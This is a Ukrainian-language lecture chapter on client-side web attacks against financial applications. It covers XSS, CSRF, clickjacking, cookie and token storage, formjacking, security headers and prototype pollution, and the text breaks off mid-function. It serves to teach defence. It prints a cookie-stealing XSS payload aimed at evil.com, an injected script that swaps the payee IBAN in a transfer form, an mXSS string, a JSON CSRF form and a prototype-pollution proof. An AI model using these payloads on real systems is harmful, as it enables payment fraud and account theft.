4.1 Міжсайтовий скриптинг (Cross-Site Scripting, XSS)

Перш ніж ми перейдемо до конкретних атак, важливо зрозуміти контекст. Сучасний веб-додаток — це не просто сторінка з текстом. Це повноцінна програма, яка виконується у браузері користувача. Браузер довіряє коду, який надходить з домену сайту: дозволяє йому читати cookies, звертатися до API, маніпулювати DOM-деревом сторінки. Клієнтські атаки експлуатують саме цю довіру — змушують браузер виконати шкідливий код так, ніби він є частиною легітимного додатку.

Міжсайтовий скриптинг (Cross-Site Scripting, XSS) — це тип вразливості, при якому зловмисник впроваджує шкідливий JavaScript-код у веб-сторінку, і цей код виконується в браузері жертви. Назва «Cross-Site Scripting» означає, що скрипт з одного сайту (зловмисника) виконується в контексті іншого сайту (жертви). Абревіатуру обрали XSS, а не CSS, щоб не плутати з каскадними таблицями стилів.

XSS стабільно входить до OWASP Top 10 — авторитетного рейтингу найкритичніших вразливостей веб-додатків. За даними платформи HackerOne, XSS є найчастіше повідомлюваною вразливістю у програмах пошуку помилок (bug bounty). У фінансовому секторі наслідки XSS катастрофічні: крадіжка сесій інтернет-банкінгу, підміна реквізитів платежів у реальному часі, збір даних кредитних карток.

Важливо розуміти, що XSS — це не одна конкретна помилка, а цілий клас вразливостей. Їх об'єднує одне: зловмисник домагається того, щоб браузер жертви виконав довільний JavaScript у контексті довіреного сайту. А оскільки браузер не розрізняє «свій» і «чужий» код на одному домені, цей скрипт отримує ті самі привілеї, що й легітимний код додатку — доступ до cookies, DOM, API-запитів.

Розрізняють три основних типи XSS, кожен із яких має свій механізм доставки та масштаб впливу:

1. Reflected XSS (відображений) — це найпростіший тип XSS. Шкідливий код передається через URL або параметри запиту та «відображається» у відповіді сервера без належної обробки. Ключова особливість: payload не зберігається на сервері. Для успішної атаки жертва повинна перейти за спеціально сформованим посиланням, яке містить шкідливий код прямо в URL.

  • Приклад: пошук на сайті банку — користувач шукає <script>document.location='https://evil.com/steal?c='+document.cookie</script>, і сервер вставляє цей рядок у сторінку результатів без екранування.
  • Фінансовий контекст: зловмисник надсилає клієнту банку фішинговий лист з посиланням на легітимний домен банку, але з XSS-payload у параметрі. Жертва бачить правильний домен і довіряє посиланню.
  • Вектор атаки: email-фішинг, месенджери, соціальні мережі, SMS з коротким посиланням.

2. Stored XSS (збережений) — вважається найнебезпечнішим типом XSS. Принципова відмінність від Reflected XSS полягає в тому, що шкідливий код зберігається на сервері — у базі даних, коментарях, полях профілю, повідомленнях. Після цього payload виконується у браузері кожного користувача, який переглядає заражену сторінку, без будь-якої додаткової взаємодії з боку жертви.

  • Приклад у FinTech: зловмисник вставляє XSS-payload у поле «Призначення платежу» або «Ім'я отримувача». Коли оператор банку відкриває список транзакцій, скрипт виконується в його браузері з його привілеями.
  • Реальний кейс: у 2019 році Stored XSS в онлайн-банкінгу дозволяв зловмиснику, який створив рахунок із шкідливим ім'ям, виконувати JavaScript у панелі адміністратора банку при перегляді списку клієнтів.
  • Масштаб: одна вразливість може вразити тисячі користувачів без їхньої взаємодії.

3. XSS на основі DOM (DOM-based XSS) — третій тип, який принципово відрізняється від перших двох. Тут шкідливий код виконується виключно на стороні клієнта через маніпуляцію об'єктною моделлю документа (Document Object Model, DOM), і сервер взагалі не бере участі в атаці. Вразливість знаходиться не в серверному коді, а в клієнтському JavaScript. Це робить DOM-based XSS невидимим для серверних засобів захисту — WAF (Web Application Firewall) не може його виявити, бо payload ніколи не надходить на сервер.

  • Джерела (sources): location.hash, location.search, document.referrer, window.name, postMessage.
  • Приймачі (sinks): innerHTML, document.write(), eval(), setTimeout(string), jQuery.html().
  • Особливість: дані часто передаються через fragment (#), який не надсилається на сервер, що ускладнює логування та аналіз інцидентів.
  • Приклад у SPA-банкінгу: сучасні банківські додатки на React/Angular можуть бути вразливі через dangerouslySetInnerHTML або обхід Angular-санітайзера.

Зверніть увагу на принципову відмінність: Reflected XSS вимагає активної взаємодії жертви — вона повинна перейти за спеціальним посиланням. Stored XSS не вимагає нічого — достатньо просто відкрити сторінку із зараженим контентом. А DOM-based XSS взагалі відбувається без участі сервера, що робить його невидимим для традиційних засобів захисту. Саме тому у фінансових додатках необхідно захищатися від усіх трьох типів одночасно — жоден окремий захист не є достатнім.

Контексти ін'єкції. Це дуже важливий момент для розуміння захисту. Ефективний захист від XSS вимагає розуміння контексту, в який потрапляють дані. Є п'ять основних контекстів: HTML body (потрібно HTML-encoding), HTML-атрибути (attribute encoding), JavaScript (JS encoding), URL (URL encoding) та CSS (CSS encoding). Кожен контекст вимагає різного типу екранування — і це ключовий висновок: універсального захисту не існує. Один і той самий рядок може бути безпечним у HTML-контексті, але небезпечним усередині JavaScript-блоку.

Тепер розглянемо, як виглядає різниця між вразливим і захищеним кодом на практиці. Це те, що має побачити кожен розробник фінансового додатку:

// ❌ ВРАЗЛИВИЙ КОД — Node.js/Express
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h2>Результати для: ${query}</h2>`); // Без екранування!
});

// ✅ ЗАХИЩЕНИЙ КОД — з output encoding
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h2>Результати для: ${query}</h2>`);
});
// <script> перетворюється на &lt;script&gt; — не виконується

Реальний сценарій: XSS у фінансовому додатку

// Сценарій: XSS у формі онлайн-переказу
// 1. Зловмисник знаходить Stored XSS у полі "Ім'я отримувача"
// 2. Payload перехоплює форму переказу та підміняє реквізити

// Шкідливий скрипт, що ін'єктується:
(function() {
  // Чекаємо завантаження форми переказу
  const observer = new MutationObserver(() => {
    const form = document.querySelector('#transfer-form');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        // Підміна IBAN отримувача на рахунок зловмисника
        const ibanField = form.querySelector('[name="recipient_iban"]');
        ibanField.value = 'UA903052992990004149123456789';
        form.submit(); // Відправляємо з підміненими даними
      });
      observer.disconnect();
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });
})();

Цей сценарій демонструє, наскільки руйнівними можуть бути наслідки XSS у фінансовому додатку. Зловмисник не просто «показує alert» — він отримує повний контроль над інтерфейсом банкінгу жертви та може непомітно перенаправляти кошти. При цьому користувач бачить звичайний інтерфейс і не підозрює, що його переказ було модифіковано.

Окрім трьох класичних типів XSS, існують витонченіші різновиди, які з'явилися з ускладненням веб-технологій. Розглянемо два з них, які є особливо актуальними для фінансового сектору.

Mutation XSS (mXSS)

Mutation XSS (мутаційний XSS) — це особливо підступний тип XSS, при якому спочатку безпечний HTML-код мутує, тобто змінюється під час обробки браузером, і в результаті перетворюється на шкідливий. Це відбувається через принципові відмінності в тому, як різні парсери інтерпретують один і той самий HTML. Серверний санітайзер аналізує рядок одним чином, а браузерний HTML-парсер — іншим.

  • Механізм: санітайзер аналізує HTML та вважає його безпечним. Але коли браузер вставляє цей HTML у DOM через innerHTML, він повторно парсить і «виправляє» розмітку, що може створити новий, шкідливий елемент.
  • Приклад: рядок <math><mtext><table><mglyph><style><img src onerror=alert(1)> — санітайзер бачить <img> всередині <style> як текст, але браузер через foster parenting виносить <img> назовні, де onerror виконується.
  • Фінансовий контекст: якщо банківська платформа дозволяє HTML-повідомлення між клієнтами (наприклад, опис переказу з форматуванням), mXSS може обійти серверну санітизацію.
  • Захист: використовувати санітайзери, які розуміють DOM-мутації (DOMPurify із актуальними оновленнями), або повністю відмовитися від HTML на користь Markdown із суворим рендерером.

Blind XSS

Blind XSS (сліпий XSS) — це різновид Stored XSS, який є особливо небезпечним саме для фінансових організацій. Його суть полягає в тому, що шкідливий payload виконується не на тій сторінці, куди його вводить зловмисник, а в зовсім іншому додатку або інтерфейсі, який обробляє введені дані. Зловмисник не бачить результат ін'єкції безпосередньо — звідси назва «сліпий». Він закладає payload і чекає, поки хтось з внутрішнього персоналу відкриє ці дані у своєму робочому інструменті.

  • Типові вектори: форми зворотного зв'язку (payload виконується в CRM оператора), лог-файли (payload виконується в лог-переглядачі), заголовки Referer/User-Agent (дані зберігаються в аналітиці).
  • Сценарій у FinTech: зловмисник заповнює форму звернення в техпідтримку банку, вставляючи XSS-payload у текст звернення. Коли оператор техпідтримки відкриває тикет у внутрішній CRM-системі, скрипт виконується з привілеями оператора — доступ до персональних даних клієнтів, можливість ініціювати переказ.
  • Інструменти виявлення: XSS Hunter, bXSS — спеціалізовані інструменти, які фіксують, де і коли спрацював payload (IP-адреса, cookies, скріншот сторінки, DOM).

XSS у SPA-фреймворках

Сучасні фронтенд-фреймворки (React, Angular, Vue) мають вбудований захист від XSS — автоматичне екранування виводу. Це створює хибне відчуття безпеки: розробники вважають, що фреймворк «все робить за них». Однак кожен із цих фреймворків надає API для обходу вбудованого захисту — і розробники використовують ці API набагато частіше, ніж хотілося б. Причини різні: потреба відобразити HTML-контент від користувача, інтеграція зі сторонніми бібліотеками, рендеринг маркетингового контенту з CMS. У кожному з цих випадків розробник свідомо вимикає захист, часто не усвідомлюючи наслідків:

// React — найпоширеніший приклад

// ❌ ВРАЗЛИВО — dangerouslySetInnerHTML обходить захист
function TransactionNote({ note }) {
  return <div dangerouslySetInnerHTML={{ __html: note }} />;
  // Якщо note = '<img src=x onerror="steal()">' — XSS!
}

// ✅ БЕЗПЕЧНО — React автоматично екранує текст
function TransactionNote({ note }) {
  return <div>{note}</div>;
  // '<script>' відобразиться як текст, не виконається
}

// Аналогічні вразливості:
// Angular: bypassSecurityTrustHtml() вимикає санітизацію

  4. Чому екранування повинно відбуватися при виводі (output), а не при введенні (input)? Наведіть приклад, коли input-валідація буде недостатньою.

4.2 CSRF та клікджекінг (Clickjacking)

Переходимо до другого великого класу клієнтських атак. Якщо XSS — це впровадження чужого коду на сторінку, то CSRF та клікджекінг працюють інакше: вони не вставляють нічого шкідливого у сам додаток, а змушують браузер користувача виконати небажану дію від його імені.

Підробка міжсайтових запитів (Cross-Site Request Forgery, CSRF) — це атака, при якій зловмисник змушує браузер автентифікованого користувача надіслати небажаний запит до вразливого сайту. Ефективність цієї атаки пояснюється однією фундаментальною особливістю браузерів: вони автоматично додають cookies, зокрема сесійні, до кожного запиту на відповідний домен. Це відбувається незалежно від того, звідки ініційовано запит. Тому коли шкідливий сайт відправляє запит до банку, браузер слухняно додає сесійний cookie жертви — і для банку цей запит виглядає абсолютно легітимним.

Зверніть увагу на ключову відмінність від XSS: при CSRF зловмисник не впроваджує жодного коду у сам банківський додаток. Сайт банку залишається незмінним, без жодних шкідливих скриптів. Зловмисник використовує інший сайт — свій власний — щоб змусити браузер жертви надіслати запит до банку. І оскільки браузер автоматично додає cookies, для сервера банку цей запит нічим не відрізняється від легітимного.

Сценарій атаки на інтернет-банкінг:

  1. Клієнт авторизований в інтернет-банкінгу (сесійний cookie активний).
  2. Клієнт відвідує шкідливий сайт або відкриває email з HTML-вмістом.
  3. Шкідлива сторінка містить приховану форму, яка автоматично надсилає POST-запит на bank.com/transfer з параметрами: recipient=attacker&amount=10000.
  4. Браузер додає сесійний cookie банку до запиту. Банк бачить валідну сесію та виконує переказ.

Методи захисту від CSRF:

  • CSRF-токен (шаблон синхронізатора, Synchronizer Token Pattern) — сервер генерує унікальний токен для кожної сесії або форми. Токен включається у приховане поле форми та перевіряється при отриманні запиту. Зловмисник не може отримати токен з іншого домену через Same-Origin Policy.
  • SameSite Cookies — атрибут SameSite=Strict забороняє відправку cookie з cross-site запитів. SameSite=Lax — компроміс, що дозволяє cookie лише для top-level навігації (GET). Для фінансових систем рекомендується Strict.
  • Подвійне надсилання cookie (Double Submit Cookie) — CSRF-токен зберігається в cookie та одночасно передається в тілі запиту або заголовку. Сервер порівнює обидва значення.
  • Власні заголовки запитів (Custom Request Headers) — AJAX-запити з власними заголовками (наприклад, X-Requested-With) не можуть бути надіслані між доменами без CORS preflight, що блокує CSRF.

Окремо варто підкреслити, що захист від CSRF повинен бути комплексним. CSRF-токени захищають форми, SameSite cookies обмежують відправку cookies з крос-доменних запитів, а кастомні заголовки запобігають атакам через HTML-форми. Жоден із цих механізмів окремо не є ідеальним, але разом вони створюють надійний бар'єр. Для фінансових систем рекомендується використовувати всі три рівні одночасно.

Тепер розглянемо клікджекінг — атаку, яка експлуатує не технічні, а візуальні механізми браузера.

Клікджекінг (Clickjacking, UI Redressing) — це атака, при якій зловмисник накладає прозорий або невидимий iframe з легітимним сайтом поверх своєї шкідливої сторінки. Принцип простий, але ефективний: користувач бачить одну сторінку, але насправді взаємодіє з іншою. Він думає, що натискає кнопку «Забрати приз» на сайті зловмисника, а насправді клікає на кнопку «Підтвердити переказ» у прихованому iframe банку. При цьому користувач вже автентифікований у банку, тому переказ виконується успішно.

  • Приклад у FinTech: зловмисник створює сторінку «Виграйте iPhone» з кнопкою «Забрати приз». За цією кнопкою прихований iframe з відкритою сторінкою банку та кнопкою «Підтвердити переказ на 50 000 грн».
  • Захист: HTTP-заголовок X-Frame-Options: DENY (або SAMEORIGIN) забороняє вбудовування сторінки в iframe. Сучасний підхід — директива frame-ancestors у Content Security Policy.
  • Лайкджекінг (Likejacking), курсорджекінг (Cursorjacking) — варіації клікджекінгу для підміни дій у соціальних мережах та маніпуляції курсором.

Захист cookie від CSRF: SameSite атрибут

# Налаштування cookie для фінансового додатку
Set-Cookie: sessionId=abc123;
  Secure;          # Лише через HTTPS
  HttpOnly;        # Недоступний з JavaScript
  SameSite=Strict; # Не відправляється у cross-site запитах
  Path=/;
  Domain=bank.com;
  Max-Age=1800     # 30 хвилин

# Порівняння SameSite значень:
# Strict  — cookie ніколи не надсилається cross-site (максимальний захист)
# Lax     — cookie надсилається лише при top-level GET-навігації
# None    — cookie надсилається завжди (потрібен Secure; вразливий до CSRF)

Існують менш очевидні, але не менш небезпечні різновиди CSRF та клікджекінгу, які часто залишаються поза увагою розробників. Вони заслуговують окремої уваги, оскільки стандартні захисні механізми можуть виявитися недостатніми проти цих атак.

Login CSRF: примусова автентифікація під обліковим записом зловмисника

Login CSRF — це інвертований варіант звичайного CSRF. Замість того, щоб виконати дію від імені жертви, зловмисник примушує жертву увійти під його обліковим записом. Це звучить безглуздо, але ідея дуже хитра: жертва не усвідомлює, що працює в чужому акаунті, і продовжує вводити свої конфіденційні дані — номер картки, домашню адресу, банківські реквізити. Усе це зберігається в акаунті зловмисника, до якого він має повний доступ.

  • Сценарій у FinTech: зловмисник створює обліковий запис у платіжній системі. Через CSRF він примушує жертву увійти в цей акаунт. Жертва додає свою банківську картку до «свого» профілю, не помічаючи, що це акаунт зловмисника. Зловмисник отримує доступ до даних картки.
  • Інший сценарій: Login CSRF у пошуковому сервісі — жертва працює в акаунті зловмисника, всі її пошукові запити зберігаються в акаунті зловмисника.
  • Захист: CSRF-токени на формі логіну, перевірка Referer/Origin заголовків, повідомлення користувачу про зміну сесії.

CSRF у JSON API: обхід Content-Type

Розробники часто вважають, що JSON API захищений від CSRF, оскільки HTML-форми не можуть відправити Content-Type: application/json. Однак існують техніки обходу:

<!-- Обхід: відправка JSON через form enctype="text/plain" -->
<form action="https://bank.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"recipient":"UA1234567890","amount":50000,"x":"'
         value='"}' />
</form>

// ✅ ЗАХИСТ: перевірка Content-Type + кастомний заголовок
app.use('/api', (req, res, next) => {
  if (req.method !== 'GET' && !req.is('application/json')) {
    return res.status(415).json({ error: 'Unsupported Media Type' });
  }
  // Кастомні заголовки потребують CORS preflight — блокує CSRF
  if (req.method !== 'GET' && !req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing custom header' });
  }
  next();
});

Drag-and-Drop Clickjacking

Drag-and-Drop Clickjacking — вдосконалена форма клікджекінгу, при якій зловмисник маніпулює подіями перетягування (drag-and-drop) для крадіжки даних або виконання дій. На відміну від класичного клікджекінгу, ця техніка дозволяє не лише натискати кнопки, але й переміщувати дані між контекстами безпеки.

  • Крадіжка CSRF-токена: зловмисник створює «гру», де користувач перетягує елементи. Насправді він перетягує CSRF-токен з прихованого iframe банку у форму зловмисника, після чого зловмисник може здійснити запит з валідним токеном.
  • Крадіжка даних: через drag-and-drop можна витягнути текстовий вміст з прихованого iframe (наприклад, баланс рахунку, ім'я клієнта, історію транзакцій).
  • Захист: директива frame-ancestors 'none' у CSP, додатково — JavaScript-перевірка window.top === window.self для legacy-браузерів.

Контрольні запитання

  1. Поясніть, чому браузер автоматично надсилає cookies при cross-site запитах, і яким чином це робить можливою CSRF-атаку на банківський переказ.
  2. Порівняйте шаблон синхронізатора (Synchronizer Token Pattern) та подвійне надсилання cookie (Double Submit Cookie) як методи захисту від CSRF. Які переваги та недоліки кожного підходу?
  3. У чому різниця між значеннями SameSite=Strict та SameSite=Lax? Чому для фінансових систем рекомендується Strict?
  4. Опишіть сценарій клікджекінг-атаки на сторінку підтвердження платежу. Як frame-ancestors у CSP запобігає цій атаці?
  5. Чому Custom Request Headers (наприклад, X-Requested-With) можуть слугувати захистом від CSRF для AJAX-запитів?
  6. Що таке Login CSRF і чому ця атака особливо небезпечна для платіжних систем, де користувачі прив'язують банківські картки?
  7. Поясніть, чому JSON API не є автоматично захищеним від CSRF. Які техніки дозволяють обійти обмеження Content-Type?
  8. Опишіть механізм Drag-and-Drop Clickjacking. Як зловмисник може використати цю техніку для крадіжки CSRF-токена з банківського додатку?

4.3 Атаки на клієнтське сховище

Ми розглянули XSS та CSRF як вектори атак. Тепер поговоримо про те, що саме зловмисники крадуть і як вони це роблять. Сучасні веб-додатки зберігають на стороні клієнта значно більше даних, ніж може здатися на перший погляд: сесійні токени, JWT-токени автентифікації, персональні дані користувачів, кеш транзакцій, налаштування інтерфейсу. Усі ці дані зберігаються у різних механізмах браузера — cookies, localStorage, sessionStorage, IndexedDB — і кожен з цих механізмів має свої вразливості, які зловмисники активно експлуатують у фінансовому секторі.

Розуміння того, де саме зберігаються дані у браузері, є критично важливим для побудови захисту. Cookies — це найстаріший механізм, який має розвинену систему атрибутів безпеки (HttpOnly, Secure, SameSite). localStorage та sessionStorage — новіші API, які значно зручніші для розробників, але при цьому не мають жодних вбудованих механізмів обмеження доступу. IndexedDB — повноцінна база даних у браузері, яка також повністю доступна через JavaScript. Парадокс полягає в тому, що розробники часто обирають зручність замість безпеки, зберігаючи чутливі дані у найменш захищених сховищах.

Крадіжка cookies:

  • Через XSS: класичний вектор — document.cookie відправляється на сервер зловмисника. Захист: атрибут HttpOnly забороняє доступ до cookie через JavaScript.
  • Через мережу: на незахищених HTTP-з'єднаннях cookies передаються у відкритому вигляді. Захист: атрибут Secure дозволяє передачу лише через HTTPS + HSTS (HTTP Strict Transport Security).
  • Підкидання cookie (Cookie Tossing): зловмисник встановлює cookie на батьківському домені, що перезаписує cookie піддомену. Актуально для банків із кількома піддоменами (online.bank.com, api.bank.com).

Проблеми localStorage та sessionStorage:

  • Доступні будь-якому JavaScript на сторінці — XSS дає повний доступ до всіх збережених даних.
  • Немає атрибуту HttpOnly або аналогу — неможливо обмежити доступ з JS.
  • localStorage зберігається безстроково, навіть після закриття браузера. JWT-токени у localStorage — це постійний ризик.
  • Рекомендація для FinTech: зберігати access token у пам'яті (JavaScript-змінна), refresh token — у HttpOnly cookie. Не використовувати localStorage для чутливих даних.

Це питання зберігання токенів є одним із найдискусійніших у спільноті веб-безпеки. Існує навіть окремий термін — «the token storage debate». Суть дискусії: де безпечніше зберігати JWT-токен — у cookie чи у localStorage? Правильна відповідь для фінансових додатків: access token — виключно в оперативній пам'яті (JavaScript-змінна), а refresh token — у HttpOnly cookie. Так, при оновленні сторінки користувачу доведеться пройти silent refresh, але це — прийнятна ціна за безпеку.

Викрадення сесії (Session Hijacking) — це загальний термін для групи атак, спрямованих на перехоплення або крадіжку сесійного ідентифікатора з метою отримання доступу до акаунту жертви. Якщо зловмисник отримує ваш session ID, він фактично стає вами для сервера — може переглядати баланс, здійснювати перекази, змінювати налаштування. Існує кілька різновидів цієї атаки:

  • Перехоплення сесії (Session Sniffing) — перехоплення ідентифікатора сесії через незашифрований трафік (WiFi у кафе).
  • Фіксація сесії (Session Fixation) — зловмисник встановлює відомий ідентифікатор сесії жертві до автентифікації, а після логіну жертви використовує цей ідентифікатор.
  • Міжсайтове включення скриптів (Cross-Site Script Inclusion, XSSI) — викрадення даних з JSON-відповідей через тег <script>, якщо відповідь є валідним JavaScript.

Окремо слід зупинитися на атаці, яка поєднує в собі елементи XSS та supply chain — і при цьому безпосередньо загрожує фінансам кінцевих користувачів.

Формджекінг (Formjacking) — це одна з найнебезпечніших сучасних атак на фінансовий сектор. Суть полягає в ін'єкції шкідливого JavaScript безпосередньо у платіжні форми для крадіжки даних кредитних карток у реальному часі. Користувач заповнює форму оплати на легітимному сайті, натискає «Оплатити» — і все працює нормально, товар оплачено. Але одночасно шкідливий скрипт непомітно копіює дані картки і відправляє їх на сервер зловмисника.

Найвідоміша група, що спеціалізується на формджекінгу — Magecart. Вона здійснила серію масштабних атак: British Airways (380 000 карток скомпрометовано), Ticketmaster, Newegg. Зловмисники компрометують або сам сайт, або — що більш підступно — сторонній JavaScript-скрипт, який підключений до платіжної сторінки: бібліотеку аналітики, чат-віджет, рекламний скрипт, файл із CDN. Один скомпрометований скрипт може вразити тисячі сайтів одночасно. Захист: перевірка цілісності підресурсів (Subresource Integrity, SRI), обмеження сторонніх скриптів через CSP, ізоляція платіжних сторінок від стороннього коду.

Безпечна конфігурація cookies для фінансового додатку

// Node.js/Express — налаштування безпечних cookies
const session = require('express-session');

app.use(session({
  name: 'bankSessionId',  // Не використовуйте стандартні імена (JSESSIONID, connect.sid)
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,    // ✅ Недоступний з JavaScript (захист від XSS-крадіжки)
    secure: true,      // ✅ Лише через HTTPS (захист від перехоплення в мережі)
    sameSite: 'strict', // ✅ Не надсилається cross-site (захист від CSRF)
    maxAge: 15 * 60 * 1000, // 15 хвилин — короткий час життя для банкінгу
    domain: '.bank.com',
    path: '/'
  }
}));

// Додатковий захист: HSTS для примусового HTTPS
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload');
  next();
});

localStorage vs sessionStorage: порівняння ризиків

// ❌ НЕБЕЗПЕЧНО: зберігання токенів у localStorage
localStorage.setItem('access_token', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('user_data', JSON.stringify({
  name: 'Іван Петренко',
  iban: 'UA903052992990004149123456789',
  balance: 125000
}));
// Проблема: XSS дає ПОВНИЙ доступ до всіх даних
// localStorage зберігається БЕЗСТРОКОВО навіть після закриття браузера

// ⚠️ sessionStorage — трохи краще, але все ще вразливий до XSS
sessionStorage.setItem('temp_token', 'eyJhbGciOiJIUzI1NiIs...');
// Видаляється при закритті вкладки, але XSS все одно має доступ

// ✅ РЕКОМЕНДОВАНИЙ підхід для фінансових додатків:
// 1. Access token — зберігати ЛИШЕ в пам'яті (JavaScript-змінна)
let accessToken = null; // Зникає при оновленні сторінки

// 2. Refresh token — у HttpOnly Secure cookie
// (встановлюється сервером, недоступний з JS)

// 3. При оновленні сторінки — silent refresh через refresh token cookie
async function silentRefresh() {
  const response = await fetch('/api/auth/refresh', {
    credentials: 'include' // Надсилає HttpOnly cookie
  });
  const data = await response.json();
  accessToken = data.access_token; // Зберігаємо лише в пам'яті
}

4.4 Захист від клієнтських атак

Ми розглянули різноманітні клієнтські атаки — від XSS до формджекінгу. Тепер зосередимося на тому, як від них захищатися. Головний принцип — це глибокий захист (defense in depth), тобто багаторівневий підхід, де кожен рівень компенсує можливі недоліки іншого. Не можна покладатися лише на один механізм: якщо XSS-фільтр пропустить payload, його повинен зупинити CSP; якщо й CSP обійдено — захист cookies через HttpOnly обмежить збитки. Від правильного кодування виводу до суворих HTTP-заголовків безпеки та ізоляції критичних компонентів — усе це ланки одного ланцюга.

Політика безпеки контенту (Content Security Policy, CSP) — це критично важливий HTTP-заголовок, який вказує браузеру, звідки дозволено завантажувати ресурси: скрипти, стилі, зображення, шрифти, iframe-и. CSP є, мабуть, найпотужнішим інструментом захисту від XSS, оскільки навіть якщо зловмиснику вдалося впровадити шкідливий тег <script>, браузер відмовиться його виконати, якщо джерело скрипта не відповідає політиці. Розглянемо основні директиви:

  • script-src — дозволяє виконання скриптів лише з визначених джерел. script-src 'self' дозволяє лише скрипти із того самого домену, блокуючи inline-скрипти та eval().
  • style-src — контроль завантаження CSS. Забороняє вбудовані стилі (inline styles), які можуть використовуватися для витоку даних через CSS-ін'єкцію.
  • connect-src — обмежує домени для AJAX-запитів та WebSocket. Запобігає відправці вкрадених даних на зовнішні сервери.
  • frame-ancestors — замінює X-Frame-Options, контролює вбудовування сторінки в iframe.
  • report-uri / report-to — браузер надсилає звіти про порушення CSP, що дозволяє виявляти атаки та помилки в політиці.
  • Сувора CSP: замість білого списку доменів використовувати підхід на основі nonce (script-src 'nonce-random123') або на основі хешу. Білий список легко обходиться через JSONP-ендпоінти або обхід Angular-пісочниці на дозволених доменах.

На практиці впровадження CSP — це ітеративний процес. Спочатку політику встановлюють у режимі Report-Only, де браузер лише повідомляє про порушення, але не блокує ресурси. Команда безпеки аналізує звіти, коригує директиви, і лише після стабілізації переводить CSP у примусовий режим. Для фінансових додатків цей процес може тривати тижні, але результат того вартий — суворий CSP значно зменшує поверхню атаки XSS.

Перевірка цілісності підресурсів (Subresource Integrity, SRI) — це механізм, який дозволяє переконатися, що файл, завантажений із зовнішнього джерела (CDN), не був модифікований. Працює він так: розробник обчислює криптографічний хеш файлу і додає його у атрибут integrity на тегах <script> та <link>. Коли браузер завантажує файл, він порівнює хеш завантаженого вмісту з очікуваним. Якщо CDN скомпрометовано і скрипт змінено — як це сталося у випадку з атаками Magecart — хеш не збігається, і браузер відмовиться виконувати цей файл. Це прямий захист від supply chain атак через CDN.

Екранування виводу (Output Encoding) — це найфундаментальніший і найважливіший захист від XSS. Ідея проста: кожен раз, коли додаток виводить дані на сторінку, він повинен перетворити спеціальні символи на їхні безпечні еквіваленти, щоб браузер трактував їх як текст, а не як код. Але є критичний нюанс — кожен контекст виводу вимагає свого типу encoding:

  • HTML context: < → &lt;, > → &gt;, & → &amp;
  • HTML attribute: додатково екрануються лапки та спеціальні символи
  • JavaScript context: Unicode-escape для спеціальних символів
  • URL context: percent-encoding для параметрів
  • Правило: екранувати при виводі (output), а не при введенні (input). Дані зберігаються у чистому вигляді, а екрануються відповідно до контексту, де відображаються.

Довірені типи (Trusted Types) — це відносно новий, але дуже перспективний браузерний API, який запобігає XSS на основі DOM безпосередньо на рівні платформи. Ідея революційна: замість того щоб сподіватися, що розробники завжди правильно санітизують дані, Trusted Types забороняють присвоєння звичайних рядків до небезпечних приймачів (sinks) — таких як innerHTML, document.write, eval. Дозволені лише спеціальні «довірені» об'єкти, створені через явну санітизацію. Це означає, що навіть якщо XSS-payload потрапить у код, браузер відмовиться його виконати, бо це звичайний рядок, а не довірений тип.

Google був одним із перших, хто впровадив Trusted Types у своїх продуктах — Gmail, Google Drive, YouTube. За їхніми даними, це дозволило зменшити кількість DOM XSS вразливостей на понад 60%. Для фінансових додатків, де кожна XSS-вразливість може призвести до прямих фінансових збитків, впровадження Trusted Types є стратегічно важливим кроком.

Комплекс заголовків безпеки (Secure Headers) для фінансового додатку:

  • Content-Security-Policy — захист від XSS та data injection
  • X-Content-Type-Options: nosniff — запобігання MIME-sniffing
  • X-Frame-Options: DENY — захист від clickjacking
  • Strict-Transport-Security — примусовий HTTPS (HSTS)
  • Referrer-Policy: strict-origin-when-cross-origin — контроль витоку URL
  • Permissions-Policy — обмеження доступу до API браузера (камера, мікрофон, геолокація)

4.5 Сучасні клієнтські вектори атак

На завершення лекції розглянемо атаки, які з'явилися порівняно нещодавно і стають дедалі актуальнішими. Еволюція веб-технологій не тільки дає розробникам нові інструменти, але й породжує нові вектори клієнтських атак. Сучасний фінансовий додаток — це не просто HTML-сторінка. Він використовує сотні npm-залежностей, комунікує між вікнами через postMessage, підтримує WebSocket-з'єднання для котирувань у реальному часі, використовує Service Workers для офлайн-режиму. Кожна з цих технологій розширює так звану поверхню атаки (attack surface) далеко за межі класичних XSS та CSRF.

Prototype Pollution (забруднення прототипу)

Prototype Pollution — це атака, специфічна саме для JavaScript, яка експлуатує ключову особливість мови: прототипне успадкування. У JavaScript кожен об'єкт має прототип — батьківський об'єкт, від якого він успадковує властивості. На вершині цього ланцюга стоїть Object.prototype, який є предком усіх об'єктів. Якщо зловмисник зможе додати властивість до Object.prototype — наприклад, isAdmin = true — то ця властивість буде «видна» у кожному об'єкті додатку, де вона не визначена явно. Це може призвести до XSS, обходу автентифікації або підвищення привілеїв.

  • Небезпека: вразливість поширюється глобально — одна забруднена властивість впливає на всі об'єкти в додатку одночасно, що робить цю атаку особливо руйнівною у складних фінансових системах з багатьма модулями.
  • Вектори: бібліотеки глибокого злиття об'єктів (deep merge), парсери URL-параметрів (?__proto__[isAdmin]=true), JSON.parse з подальшим merge.
  • Реальні CVE: lodash _.merge(), jQuery $.extend(true, ...), express qs-парсер — усі мали вразливості Prototype Pollution.
  • Prototype Pollution → XSS: забруднення прототипу може активувати XSS через бібліотеки шаблонізації — наприклад, додавання властивості __proto__.innerHTML або __proto__.srcdoc, яку потім використовує шаблонізатор.
// Prototype Pollution — атака та захист

// ❌ ВРАЗЛИВА функція глибокого злиття
function deepMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Зловмисник надсилає: {"__proto__": {"isAdmin": true}}
deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
const user = {};
console.log(user.isAdmin); // true — обхід авторизації для ВСІХ об'єктів!

// ✅ ЗАХИСТ: блокування небезпечних ключів
function safeMerge(target, source) {
  for (let key in source) {
